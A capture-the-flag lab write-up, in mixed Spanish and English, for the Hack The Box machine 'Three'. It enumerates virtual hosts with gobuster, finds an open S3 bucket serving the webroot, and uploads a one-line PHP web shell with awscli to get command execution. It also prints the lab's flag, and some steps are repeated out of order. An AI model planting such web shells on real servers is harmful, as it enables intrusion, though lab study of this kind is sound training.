Maquina 9 Three - Cloud Remote code Execution Amazon Web Services (AWS) llamado S3 (Simple Storage Service)
IP: 10.129.66.163

Empezamos con un nmap -sV 10.129.66.163

Nos devuelve puerto 22 y 80 TCP abiertos

Abrimos en nuestro navegador la pagina web que tiene este IP y encontramos en la parte de datos de contacto que el correo electronico que usan tiene
una extension thetoppers.htb
Por lo que quiere decir que esta pagina web puede tener otros subdominios que podemos encontrar información importante. Para ello primero vamos a agregar
al archivo /etc/hosts el numero de Ip y el dominio para que nuestro browuser lo resuelva directamente. Usamos el comando

echo "10.129.66.163 thetoppers.htb" | sudo tee -a /etc/hosts

As we have the domain thetoppers.htb , let us enumerate for any other sub-domains that may be present
on the same server.
Para ello usaremos Gobuster con el siguiente comando

gobuster vhost -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain thetoppers.htb

vhost : Uses VHOST for brute-forcing
-w : Path to the wordlist
-u : Specify the URL

Gobuster nos encontró estos 2 subdominios:

Found: s3.thetoppers.htb Status: 404 [Size: 21]
Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
Progress: 4989 / 4990 (99.98%)

para poder acceder a ellos los agregaremos a /etc/hosts.
Entrando al subdominio s3.thetoppers.htb nos muestra un JSON que dice {"status": "running"}
googleando s3 subdomain status running Nos enteramos que S3 is a cloud-based object storage service. It allows us to store things in containers called buckets. AWS
S3 buckets have various use-cases including Backup and Storage, Media Hosting, Software Delivery, Static
Website etc. The files stored in the Amazon S3 bucket are called S3 objects.

Podemos interactuar con AWS a traves de awscli

Primero configuramos con comando
aws configure
Y pondremos en todas las preguntas temp

We can list all of the S3 buckets hosted by the server by using the ls command
aws --endpoint=http://s3.thetoppers.htb s3 ls

We can also use the ls command to list objects and common prefixes under the specified bucket.

aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb


We see the files index.php , .htaccess and a directory called images in the specified bucket. It seems like
this is the webroot of the website running on port 80 . So the Apache server is using this S3 bucket as
storage.

awscli has got another feature that allows us to copy files to a remote bucket. We already know that the
website is using PHP. Thus, we can try uploading a PHP shell file to the S3 bucket and since it's uploaded to
the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we
will achieve remote code execution.

Let's create a PHP file to upload.

echo '<?php system($_GET["cmd"]); ?>' > shell.php

Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command.
We can confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php. Let us try
executing the OS command id using the URL parameter cmd .
The response from the server contains the output of the OS command id , which verified that we have code
execution on the box. Thus, let us now try to obtain a reverse shell.
Through a reverse shell, we will trigger the remote host to connect back to our local machine's IP address on
the specified listening port. We can obtain the tun0 IP address of our local machine using the following
command.

echo '<?php system($_GET["cmd"]); ?>' > shell.php

Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command.

aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb

Una vez que pudimos subir el archivo para ejecutar una shell podemos usar Burpsuite para encontrar el archivo flag.txt

FLAG: a980d99281a28d638ac68b9bf9453c2b
